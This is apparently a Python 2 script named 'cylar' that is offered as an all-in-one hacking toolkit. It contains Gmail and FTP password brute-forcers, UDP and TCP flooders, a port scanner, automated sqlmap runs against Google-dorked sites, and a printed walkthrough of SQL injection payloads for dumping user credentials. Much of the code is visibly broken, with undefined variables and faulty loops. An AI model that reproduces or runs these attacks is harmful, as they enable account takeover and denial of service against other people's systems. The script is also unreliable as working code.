	

    #    #  ###### #      #      ######
    #    #  #      #      #      #    #
    ######  ###### #      #      #    #
    #    #  #      #      #      #    #
    #    #  ###### ###### ###### ######
     
    ##### #   # #          #      ######
    #      # #  #         # #     #
    #       #   #        #####    #
    #       #   #       #     #   #
    #####   #   #####  #       #  #
     
    # Welcome to cylar
    # The ultimate hacking tool kit coded in pure python
    # With this tool you will not need any other tool
    # Gmailbrute force, FTPbruteforce,
    # Port scanner, python rooter,
    # Dns resolver, udp flooder, tcp flooder,
    # ssh bruteforce, cpanel cracker,
    #
    #################################################
     
    #Begin
    import sys
    import os
    import time
    import smtplib
    import ftplib
    import socket
    import random
    import threading
    import urllib
    import urllib2
    import termcolor
    from ftplib import FTP, error_perm
    from smtplib import SMTP
    from termcolor import colored
     
    os.system("clear")  #Change to cls if running w32#
    print colored('================================', "red")
    print colored('= C Y L A R    U N K O W N     =', "cyan")
    print colored('================================', "red")
    print colored('= XMPP : cylarwarz@creep.im    =', "cyan")
    print colored('================================', "red")
    print '\n'
    print "\n"
    print colored('-> root kernel has paniced >----- <0x8888323>', "cyan")
    print colored("-_________--________--_______-_---___--_--__--", "red")
    print colored("-_--_____---_----____---___----__-_-__----__--", "cyan")
    print colored("-__-_______--__--_-_____-----_-___-___---___--", "red")
    print colored("-_______--____--_---_-__--__--_---_-__---___-- \n", "cyan")
    print colored("[DATA BYTE FOUND CORE DUMPED() ZERO DAY EXPLOITATION ENABLED]", "red")
    while 1:
            print '1). Gmailbruteforce            8). Credits'
            print '2). Ftpbruteforce              9). Contact'
            print '3). Udp flooder                10). Administration'
            print '4). Tcp flooder                 11). Hacking artical'
            print '5). ssh bruteforce             12). How to be anonymous'
            print '6). Port scanner               13). Things to learn'
            print '7). Python server              14). More'
            selection = raw_input("Cylar$ ")
            if selection == "1":
                    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
                    smtpserver.starttls()
                    smtpserver.ehlo()
                    user = raw_input("Enter email address: ")
                    passd = open(sys.argv[1], 'r')
                    for username in user:
                            for password in passd:
                                    try:
                                            smtpserver.login(user, password)
                                            print "{*} Password Found: %s" %password
                                    except(smtplib.SMTPAuthenticationError), msg:
                                            if 'Username a' in str(msg):
                                                    print '{} Password not: %s' %password
                                            else:
                                                    break
                                   
            elif selection == "2":
                    server = raw_input("Server: ")
                    login2 = raw_input("User: ")
                    passw = open(sys.argv[1], 'r').readlines()
                    for username in login2:
                            for password in passw:
                                    try:
                                            ftp = FTP(server)
                                            ftp.login(login2, password)
                                            print "{+} Password Found: %s" %password
                                    except(ftplib.error_perm), msg:
                                            if "530" in str(msg):
                                                    print "[!] Password is not: %s" %password
                                            else:
                                                    break
            elif selection == "3":
                    class Controller(threading.Thread):
                            def __init__(self, ip, port, size):
                                    threading.Thread.__init__(self)
                                    self.ip = ip
                                    self.port = port
                                    self.size = size
                            def run(self):
                                    print "-__-----------_____-___----_" + self.ip + ":"
                                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    port = 8080
                                    bytes = random._urandom(self.size)
                                    while 2:       
                                            s.sendto(bytes,(self.ip, self.port))
                            print "Enter ip address"
                            ip = raw_input("IP Address: ")
                            threads = 100
                            for host in range(int(threads)):
                                    atck = Controller(ip, int(port), int(size))
                                    atck.start()
            elif selection == "4":
                    host = raw_input("Enter host: ")
                    port = 80
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    bytes = random._urandom(7000)
                    while 3:
                            print '___________--________---_____-_---__-___' + "[data]"
                            s.sendto(bytes,(host, port))
            elif selection == "5":
                    print colored("I am sorry this is not available on free version at this moment", "green")
            elif selection == "6":
                    ip = raw_input("Enter Ip Address: ")
                    def scan_ports(ip, port):
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            try:
                                    s.connect((ip, port))
                                    return True
                            except:
                                    return None
                    for port in range(0, 100000):
                            attempt = scan_ports(ip, port)
                            if attempt == True:
                                    print colored("PORT OPEN %d", "green") %port
                            else:
                                    print colored("PORT CLOSED %d", "red") %port
                                    break  
            elif selection == "7":
                    print colored("Python rat coming sone", "red")
            elif selection == "8":
                    os.system("clear") #Change to cls if w32
                    print colored("""
    ./Coded by the one and only Cylar
    ./I have been hacking since i was a young boy
    ./I know many types of hacking but i am a grey hat
    ./I love coding and am a skilled hacker
    ./My goals are to become a hacker for a company
    ./Missions code pentesting tools for testers
    ./I do not incourage hacking in anyway or forum unless
    ./It is for of good use IE, retreiving a users lost login
    ./Gaining access to a hacked website
    ./Securing flaws in sites
    ./More notes...
    ./Big thanks for using my tool and i hope you like it
    ./It is open source like all my tools
    ./And i incourage people to release open source too
    ./This will be updated even thoe it says requires payment
    ./That basically means waiting to update
    ./This version is the first release
    ./And i will continue to add onto it and maybe make it
    ./Bigger than metasploit framework
    ./If you are new to hacking and want to learn
     
    ./Then i would look into TCP/Networking
    ./Then learn programming
    ./Then learn sockets and firewalls
    ./Then hack to learn
     
    ./Must note use VM and set up your own
    ./Servers and try hack in a local inviroment
    ./Regards: Cylar
    ./Please [SCROLL UP] To View
            """, "cyan")
            elif selection == "9":
                    print colored("Maybe()", "green")
            elif selection == "10":
                    print colored("Option not yet available!", "red")
            elif selection == "11":
                    print colored("Adding Sone", "green")
            elif selection =="ls":
                    os.system("ls")
            elif selection =="dir":
                    os.system("dir")
            elif selection == "netstat":
                    os.system("netstat -an")
            elif selection == "12":
                    print colored("""
    .../Learn about i2p Networks
    .../Use proxys, Sockv4, v5
    .../Use vidalia and configure it threw ssh
    .../Tunnel with over 5000+ bits of encryption
    .../commands
    .../systemctl start sshd
    .../ssh -b keygen
    .../ssh -D 8008 root@127.0.0.1
    .../Now use virtulization and run tor and tunnels threw that
    .../Use anti keyloggers and remove all tracking cookies
    .../Configure about:config in your firefox and disable dns
    .../Use the following plugins
    .../httpsanywhere
    .../no script
    .../hackbar
    .../Anticookie
    .../Thats all for now.
            """, "red")
            elif selection == "13":
                    print colored("""
    ../Learn TCP networking
    ../Learn computer programming
    ../Learn internet security
    ../Learn cisco routing
    ../Learn IDS and IPS routing
    ../Learn to socket program
    ../Learn how things work
    ../Learn SQL
    ../Learn PHP
    ../Learn about firewall
    ../Learn about malware
    ../Learn about Dns
    ../Learn about protocols
    ../Learn fuzzing
    ../Learn Network Scanning
    ../Learn Learn Learn
                    """, "cyan")
            elif selection == "14":
                    os.system("clear") #Change to cls if useing w32
                    print colored("""
    15). Manual SQLI Index
    16). SQLMAP Automated
    17). Automated Anonymizer
    18). Dns resolver
    19). Keylogger
    20). TCP Fuzzer
     
    -----------------------------
    Enter: help / To display menu
    -----------------------------
    """, "red")
                    while 4:
                            selection = raw_input("Cylar$ ")
                            if selection == "15":
                                    print '''
    .../https://www.fakesite.com/index.php?id=12
    .../https://www.fakesite.com/index.php?id=12 order by 5-- /Error
    .../https://www.fakesite.com/index.php?id=12 order by 4-- /No error
    .../https://www.fakesite.com/index.php?id=-12 union select 1,2,3,4--
    .../https://www.fakesite.com/index.php?id=-12 union all select 1,@@version,3,4--
    .../https://www.fakesite.com/index.php?id=-12 union all select 1,group_concat(table_name),3,4-- from information_schema.tables where table = database()--
    .../https://www.fakesite.com/index.php?id=-12 union all select 1,group_concat(column_name),3,4-- from information_schema.columns where table_schema = database()--
    .../https://www.fakesite.com/index.php?id=-12 union all select 1,group_concat(user,pass),3,4-- from <admin/users> --
    .../Hacked via manual sq
                                    '''
                            elif selection == "help":
                                    print colored("""
    15). Manual SQLI Index
    16). SQLMAP Automated
    17). Automated Anonymizer
    18). Dns resolver
    19). Keylogger
    20). TCP Fuzzer
    """, "red")
                            elif selection == "16":
                                    os.system("sqlmap -g inurl:/index.php?id=** --batch")
                                    os.system("sqlmap -g inurl:/page.php?id=*** --batch")
                            elif selection == "17":
                                    os.system("vidalia")
                                    if "not found" in str(os.system("vidalia")):
                                            os.system("sudo apt-get install vidalia")
                                            os.system("vidalia")
                                            os.system("macchanger -s -r")
                                    else:
                                            pass
                            elif selection == "18":
                                    site = raw_input("Enter a website: ")
                                    print socket.gethostbyname_ex(socket.gethostname())
                                    if site == "127.0.0.1":
                                            import commands
                                            output = commands.getoutput("/sbin/ifconfig")
                                            site = parseaddress(output)
                            elif selection == "ls":
                                    os.system("ls")
                            elif selection == "l":
                                    os.system("l")
                            elif selection == "dir":
                                    os.system("dir")
                            elif selection == "exit":
                                    sys.exit(0)

